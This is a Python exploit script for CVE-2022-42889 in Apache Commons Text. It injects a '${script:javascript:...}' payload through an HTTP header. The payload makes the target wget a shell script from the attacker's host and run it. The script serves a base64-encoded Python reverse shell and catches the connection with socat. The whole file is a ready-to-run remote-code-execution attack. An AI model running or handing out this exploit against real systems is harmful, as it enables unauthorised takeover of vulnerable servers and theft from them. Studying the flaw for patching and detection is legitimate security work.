#!/usr/bin/env python3
#  -*- coding: utf-8 -*- #######################################################################################
#  ┌─┐┌─┐┌┬┐┌┬┐┌─┐┌┐┌┌─┐  ┌┬┐┌─┐─┐ ┬┌┬┐                                                                        #
#  │  │ ││││││││ ││││└─┐───│ ├┤ ┌┴┬┘ │                                                                         #
# └─┘└─┘┴ ┴┴ ┴└─┘┘└┘└─┘   ┴ └─┘┴ └─ ┴                                                                          #
#                                                                                                              #
# apache-commons-text-rce.py - nighter@nighter.se                                                    #
#                                                                                                              #
# DATE                                                                                                         #
# 20/10/2022                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
#                                                                                                              #
# CVE-2022-42889 - Apache Commons Text performs variable interpolation, allowing properties to be dynamically  #
# evaluated and expanded. The standard format for interpolation is "${prefix:name}", where "prefix" is used    #
# to locate an instance of org.apache.commons.text.lookup.StringLookup that performs the interpolation.        #
# Starting with version 1.5 and continuing through 1.9, the set of default Lookup instances included           #
# interpolators that could result in arbitrary code execution or contact with remote servers.                  #
# These lookups are: - "script" - execute expressions using the JVM script execution engine (javax.script) -   #
# "dns" - resolve dns records - "url" - load values from urls, including from remote servers Applications      #
# using the interpolation defaults in the affected versions may be vulnerable to remote code execution or      #
# unintentional contact with remote servers if untrusted configuration values are used. Users are recommended  #
# to upgrade to Apache Commons Text 1.10.0, which disables the problematic interpolators by default.           #
#                                                                                                              #
################################################################################################################

import signal
import termios
import select
import socket
import os
import fcntl
import sys
import time
import base64
import http.server
import socketserver


from multiprocessing import Process
from shutil import copyfile
import requests

# Handler to exist cleanly on ctrl+C


def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    sys.exit()


signal.signal(signal.SIGINT, signal_handler)


def BuildPythonReverseShell():

    python_rev_shell = '''python -c \'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\
s.connect(("%s", %s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh");s.close()\'''' % (LHOST, LPORT)

    result = "echo %s|base64 -d|sh" % base64.b64encode(python_rev_shell.encode('utf-8')).decode('utf-8')
    return result


def prepare_payload():

    payload = '''#!/bin/sh
%s''' % BuildPythonReverseShell()

    with open('/tmp/payload.sh', 'w') as file:
        file.write(payload)



def http_listner():

    PORT = 9999

    os.chdir('/tmp')
    Handler = http.server.SimpleHTTPRequestHandler

    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("[+] Serving at port: ", PORT)
        httpd.serve_forever()


def exploit():

    time.sleep(5)

    _payload = '${script:javascript:java.lang.Runtime.getRuntime().exec("wget http://%s:9999/payload.sh -O /tmp/payload.sh")}' % LHOST

    print("[+] Exploit")
    headers = {
        "X-Api-Version": "%s" % _payload}
    requests.get(URL, headers=headers)

    _payload = '${script:javascript:java.lang.Runtime.getRuntime().exec("sh -i /tmp/payload.sh")}'

    headers = {
        "X-Api-Version": "%s" % _payload}
    requests.get(URL, headers=headers)
    print('')


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print("""
┌─┐┌─┐┌┬┐┌┬┐┌─┐┌┐┌┌─┐  ┌┬┐┌─┐─┐ ┬┌┬┐
│  │ ││││││││ ││││└─┐───│ ├┤ ┌┴┬┘ │
└─┘└─┘┴ ┴┴ ┴└─┘┘└┘└─┘   ┴ └─┘┴ └─ ┴
[nighter@nighter.se]
    """)
        print("Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./apache_commons_text_rce.py 'http://127.0.0.1:8000' 192.168.1.75 7777\n")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print("[+] LHOST: %s" % LHOST)

    prepare_payload()

    p = Process(target=http_listner)
    p.start()

    # Run ldap server async
    p = Process(target=exploit)
    p.start()

    # Start listener
    print("[+] Shell listen")
    os.system('socat file:`tty`,raw,echo=0 tcp-listen:%s' % str(LPORT))
